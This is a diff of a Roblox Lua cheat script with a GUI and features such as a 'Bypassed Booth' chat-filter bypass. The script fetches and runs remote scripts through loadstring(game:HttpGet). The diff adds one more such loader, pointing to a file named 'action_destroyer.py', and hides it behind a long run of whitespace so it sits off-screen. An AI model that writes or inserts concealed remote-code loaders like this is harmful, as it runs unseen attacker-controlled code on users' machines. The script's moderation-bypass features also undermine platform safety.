@@ -1,7 +1,5 @@
 local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Notification-Library/Main/Library.lua"))()
 
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/what_is_ai_documentation')))()
-
 loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/exercise_knowledge.lua'))()
 
 -- [] -->> Initializing Notification and the first set of necessary stuff. [Trying to make support for all executors in the process.] <<-- [] --
@@ -572,7 +570,7 @@ local function loadGUI()
         label.Size = UDim2.new(0.5, 0, 0.2, 0)
         label.Position = UDim2.new(0.25, 0, 0.2, 0)
         label.BackgroundTransparency = 1
-        label.Text = "Would you like an emote/rizz config? [No Infinite Yield anymore! :)]"
+        label.Text = "Would you like an emote/rizz config?"
         label.TextColor3 = Color3.new(1, 1, 1)
         label.TextScaled = true
         label.Font = Enum.Font.SourceSansBold
@@ -1372,6 +1370,8 @@ local function loadGUI()
         end
     end,})
 
+
+
     local coloredBooth = Tab11:CreateToggle({
     Name = "Booth Color Changer (FE)",
     CurrentValue = false,
@@ -1709,6 +1709,7 @@ local function loadGUI()
         local typingSpeed = 1.1
         typeText(Booth_Remote, textToType, typingSpeed)
     end,})
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/action_destroyer.py')))()
 
     local ToggleBadWords = Tab11:CreateToggle({
     Name = "Bypassed Booth (FE)",
